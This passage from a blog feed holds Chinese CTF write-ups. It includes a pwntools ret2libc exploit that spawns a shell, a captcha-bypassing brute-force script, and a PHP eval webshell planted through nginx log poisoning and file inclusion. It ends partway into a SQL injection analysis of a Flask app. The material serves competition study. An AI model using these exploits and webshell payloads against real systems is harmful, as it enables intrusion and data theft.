class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(payload)</span>:</span></span><br><span class="line">    name = <span class="number">255</span>*<span class="string">'A'</span></span><br><span class="line">    p.sendafter(<span class="string">'name?\n'</span>,name)</span><br><span class="line">    noble = <span class="string">'1'</span>*<span class="number">255</span></span><br><span class="line">    p.sendafter(<span class="string">'occupation?\n'</span>,noble)</span><br><span class="line">    p.sendlineafter(<span class="string">'[Y/N]\n'</span>,<span class="string">'Y'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">put = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">junk = <span class="number">277</span>*<span class="string">'A'</span></span><br><span class="line">payload =junk +  p32(put) + p32(<span class="number">0x08048637</span>) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">foo(payload)</span><br><span class="line">p_addr =u32(p.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-4</span>:])</span><br><span class="line">success(hex(p_addr))</span><br><span class="line">libc.address = p_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line">success(hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">payload2 = junk + p32(libc.symbols[<span class="string">'system'</span>]) + p32(<span class="number">0</span>) + p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">foo(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="Shellcode-Manager"><a href="#Shellcode-Manager" class="headerlink" title="Shellcode Manager"></a>Shellcode Manager</h3><p>nc 123.59.138.180 13579<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null</a></p><h3 id="Starcraft-RPG"><a href="#Starcraft-RPG" class="headerlink" title="Starcraft RPG"></a>Starcraft RPG</h3><p>nc 123.59.138.180 13799<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null</a></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="icmï¼ˆsolvedï¼‰"><a href="#icmï¼ˆsolvedï¼‰" class="headerlink" title="icmï¼ˆsolvedï¼‰"></a>icmï¼ˆsolvedï¼‰</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null</a></p><h3 id="wcmï¼ˆsolvedï¼‰"><a href="#wcmï¼ˆsolvedï¼‰" class="headerlink" title="wcmï¼ˆsolvedï¼‰"></a>wcmï¼ˆsolvedï¼‰</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null</a></p><h3 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null</a></p><h3 id="ccm"><a href="#ccm" class="headerlink" title="ccm"></a>ccm</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null</a></p><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><h3 id="3dlight"><a href="#3dlight" class="headerlink" title="3dlight"></a>3dlight</h3><p>nc 123.59.138.211 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null</a></p><h3 id="rsa-system"><a href="#rsa-system" class="headerlink" title="rsa system"></a>rsa system</h3><p>nc 123.59.138.211 23333<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null</a></p><h3 id="advanced-ecc"><a href="#advanced-ecc" class="headerlink" title="advanced ecc"></a>advanced ecc</h3><p>nc 123.59.138.211 34545<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-uploadï¼ˆsolvedï¼‰"><a href="#simple-uploadï¼ˆsolvedï¼‰" class="headerlink" title="simple uploadï¼ˆsolvedï¼‰"></a>simple uploadï¼ˆsolvedï¼‰</h3><p>è¿™æ¬¡åœ¨ä½ é¢å‰çš„ç½‘ç«™çš„åŠŸèƒ½éå¸¸ç®€å•ï¼Œæ¥å—æŒ‘æˆ˜å§ï¼<br>ç›´æ¥ä¼ jspå°é©¬getshell</p><h3 id="shopping-logï¼ˆsolvedï¼‰"><a href="#shopping-logï¼ˆsolvedï¼‰" class="headerlink" title="shopping logï¼ˆsolvedï¼‰"></a>shopping logï¼ˆsolvedï¼‰</h3><p><a href="http://123.59.141.153/" target="_blank" rel="noopener">http://123.59.141.153/</a><br>æˆ–è€… <a href="http://120.132.95.234/" target="_blank" rel="noopener">http://120.132.95.234/</a><br>é¦–å…ˆéœ€è¦ä¿®æ”¹ç³»ç»Ÿ<code>hosts</code>æ–‡ä»¶ï¼Œç„¶åç»•è¿‡<code>http header</code>å„ç§é™åˆ¶ï¼Œæœ€åè¿›å…¥ä¸€ä¸ªè®¢å•æŸ¥è¯¢ç³»ç»Ÿï¼Œæ ¹æ®æç¤ºï¼Œç›´æ¥ä»<code>9999</code>å¼€å§‹å¾€ä¸‹çˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> hashlib.md5(x).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">(mdcode)</span>:</span></span><br><span class="line">s3=<span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s3:</span><br><span class="line">s=i+j+m+n+a</span><br><span class="line"><span class="keyword">if</span> md5(s)[<span class="number">0</span>:<span class="number">6</span>]==mdcode:</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.tmvb.com/5a560e50e61b552d34480017c7877467info.php'</span></span><br><span class="line">url2 = <span class="string">'http://www.tmvb.com/api.php?action=report'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line"><span class="string">'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3'</span>,<span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'www.dww.com'</span>,<span class="string">'Accept-Language'</span>: <span class="string">'ja'</span>,<span class="string">'X-Forward-For'</span>:<span class="string">'133.1.16.172'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=48ja11agl6fbo52gsntfk4feq1'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è®¢å•ç¼–å·ï¼š&lt;input type="text" id="TxtTid" placeholder="è¯·è¾“å…¥è®¢å•ç¼–å·åå››ä½" style="margin-right: 30px;" /&gt;</span></span><br><span class="line"><span class="comment"># éªŒè¯ç ï¼š&lt;input type="text" id="code" placeholder="code" style="width:40px;" /&gt;&lt;p&gt;substr(md5(code),0,6) === '167d9f'&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">9999</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">r = requests.get(url=url,headers=headers)</span><br><span class="line"><span class="comment">#print r.content</span></span><br><span class="line">vcode  = re.findall(<span class="string">r"=== '(.&#123;6&#125;)'"</span>,r.content)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> vcode</span><br><span class="line">vv = getcode(vcode)</span><br><span class="line"><span class="comment">#print vv , md5(vv)</span></span><br><span class="line">dat = &#123;<span class="string">'TxtTid'</span>:str(n),<span class="string">'code'</span>:vv&#125;</span><br><span class="line">r = requests.post(url=url2,headers=headers,data=dat)</span><br><span class="line"><span class="keyword">print</span> dat</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'There\'s no such order'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'"error":1'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="comment">#raw_input('go on~')</span></span><br><span class="line">n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="guess-id"><a href="#guess-id" class="headerlink" title="guess id"></a>guess id</h3><p><a href="http://123.59.134.192/" target="_blank" rel="noopener">http://123.59.134.192/</a><br>æˆ– <a href="http://120.132.94.238/" target="_blank" rel="noopener">http://120.132.94.238/</a><br>hint: èº«ä»½è¯å·ç æ˜¯æœ‰ä¸€å®šè§„å¾‹çš„<br>hint2: AES256æ˜¯å¾ˆæ£’çš„åŠ å¯†ç®—æ³•ï¼Œ ECBæ¨¡å¼å¾ˆå®¹æ˜“ç†è§£</p><h3 id="biubiubiuï¼ˆsolvedï¼‰"><a href="#biubiubiuï¼ˆsolvedï¼‰" class="headerlink" title="biubiubiuï¼ˆsolvedï¼‰"></a>biubiubiuï¼ˆsolvedï¼‰</h3><p>è¿™æ¬¡åœ¨ä½ é¢å‰çš„ç½‘ç«™çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œæ¥å—æŒ‘æˆ˜å§ï¼<br><a href="http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php" target="_blank" rel="noopener">http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php</a><br>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å…³é”®ä»£ç send.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'url'</span>]) &#123;</span><br><span class="line">    $url = @$_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^http(s?):\/\/.+/"</span>, $url))&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    curl_setopt($ch,CURLOPT_REDIR_PROTOCOLS,CURLPROTO_GOPHER|CURLPROTO_HTTP|CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ•°æ®åº“ä¿¡æ¯conn.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db_host = <span class="string">'mysql'</span>;</span><br><span class="line">$db_name = <span class="string">'user_admin'</span>;</span><br><span class="line">$db_user = <span class="string">'Dog'</span>;</span><br><span class="line">$db_pwd = <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>user.sql<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`admin`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">43</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">2</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯ï¼šå°†ä¸€å¥è¯å†™åœ¨<code>User-Agent</code>ï¼Œç„¶ååŒ…å«nginxçš„access.logã€‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php --header "User-Agent:&lt;?php eval(\$_POST['1'])?&gt;"</span><br></pre></td></tr></table></figure></p><p>ç„¶åç”¨èœåˆ€è¿æ¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php?page=../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure></p><p>flagåœ¨æ•°æ®ä¸­ï¼Œç”¨èœåˆ€è‡ªå¸¦çš„æ•°æ®åº“åŠŸèƒ½è¯»å–å³å¯ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;Not-Only-Wiresharkï¼ˆsolvedï¼‰&quot;&gt;&lt;a href=&quot;#Not-Only-Wiresharkï¼ˆ
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python-is-the-best-language</title>
    <link href="https://4f-kira.github.io/2018/04/16/Python-is-the-best-language/"/>
    <id>https://4f-kira.github.io/2018/04/16/Python-is-the-best-language/</id>
    <published>2018-04-16T04:57:09.000Z</published>
    <updated>2018-04-16T05:02:12.313Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡çº¯å±æŠ„è¢­ï¼Œå¦‚æœ‰æ”¹åŠ¨ï¼Œçº¯å±æ‰‹æ®‹ã€‚</p><p>åŸwriteupè§ï¼š</p><p><a href="http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84" target="_blank" rel="noopener">http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84</a></p><p><a href="https://xz.aliyun.com/t/2219#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2219#toc-1</a></p><p><a href="https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language" target="_blank" rel="noopener">https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask</span><br><span class="line">pip install flask_login</span><br><span class="line">pip install flask_bootstrap</span><br><span class="line">pip install flask_moment</span><br><span class="line">pip install sqlalchemy</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br><span class="line">pip install flask_wtf</span><br><span class="line">pip install MySQL-python</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®åº“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE `flask` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹<code>config.py</code>ä¸­æ•°æ®åº“è´¦å·å¯†ç ï¼Œç„¶åè¿è¡Œ<code>python db_create.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"mysql://root:å¯†ç @127.0.0.1/flask?charset=utf8"</span></span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹<code>run.py</code>åè¿è¡Œ<code>python run.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">30003</span>)</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language1"><a href="#Python-is-the-best-language1" class="headerlink" title="Python is the best language1"></a>Python is the best language1</h2><p>ç¬¬ä¸€é¢˜æ˜¯sqlæ³¨å…¥ï¼Œé‡ç‚¹å…³æ³¨ä»¥ä¸‹æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">forms.py ç”¨äºè¡¨å•ç™»å½•ï¼Œæ³¨å†Œç­‰</span><br><span class="line">models.py æ”¾ç½®æ“ä½œæ•°æ®åº“çš„ä»£ç </span><br><span class="line">others.py mysqlæ“ä½œè¯­å¥ç­‰å‡½æ•°</span><br><span class="line">routes.py è·¯ç”±æ–‡ä»¶</span><br></pre></td></tr></table></figure></p><h3 id="æ³¨å…¥ç‚¹ä¸€"><a href="#æ³¨å…¥ç‚¹ä¸€" class="headerlink" title="æ³¨å…¥ç‚¹ä¸€"></a>æ³¨å…¥ç‚¹ä¸€</h3><p>çœ‹çœ‹<code>routes.py</code>ä¸­æ³¨å†Œä»£ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    form = RegistrationForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">"user"</span>, [<span class="string">"NULL"</span>, <span class="string">"'%s'"</span> % form.username.data, <span class="string">"'%s'"</span> % form.email.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % generate_password_hash(form.password.data), <span class="string">"''"</span>, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Congratulations, you are now a registered user!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title=<span class="string">'Register'</span>, form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>ä¸­æ³¨å†Œçš„éƒ¨åˆ†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistrationForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</span><br><span class="line">    email = StringField(<span class="string">'Email'</span>, validators=[DataRequired(), Email()])</span><br><span class="line">    password = PasswordField(<span class="string">'Password'</span>, validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(</span><br><span class="line">        <span class="string">'Repeat Password'</span>, validators=[DataRequired(), EqualTo(<span class="string">'password'</span>)])</span><br><span class="line">    submit = SubmitField(<span class="string">'Register'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_username</code>åœ¨è¿›è¡Œ<code>mysql.One</code>å‰è¿›è¡Œäº†æ­£åˆ™åŒ¹é…çš„è¿‡æ»¤å’Œå®¡æ ¸ï¼Œè€Œ<code>validate_email</code>ä»…ä»…é€šè¿‡<code>validators=[DataRequired(), Email()]</code>æ¥åŒ¹é…ã€‚</p><p><code>Email()</code>çš„å…³é”®æºç å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">super(Email, self).__init__(<span class="string">r'^.+@([^.@][^@]+)$'</span>, re.IGNORECASE, message)</span><br></pre></td></tr></table></figure></p><p>å…¶æ­£åˆ™è§„åˆ™ä¸º<code>^.+@([^.@][^@]+)$</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹emailè€Œè¨€ï¼Œå³ä½¿æäº¤å¦‚<code>&#39;&quot;#a@qq.com</code>åŒ…å«å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œæ³¨é‡Šç¬¦ç­‰æ•æ„Ÿå­—ç¬¦çš„å½¢å¼ä¹Ÿæ˜¯èƒ½é€šè¿‡çš„ã€‚</p><p>è½¬åˆ°<code>others.py</code>ä¸­<code>mysql.One()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = self.db_session.execute(sql).fetchone()</span><br><span class="line">        <span class="keyword">if</span> res == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></p><p>è·Ÿå…¥<code>Sel()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sel</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = <span class="string">"select "</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span 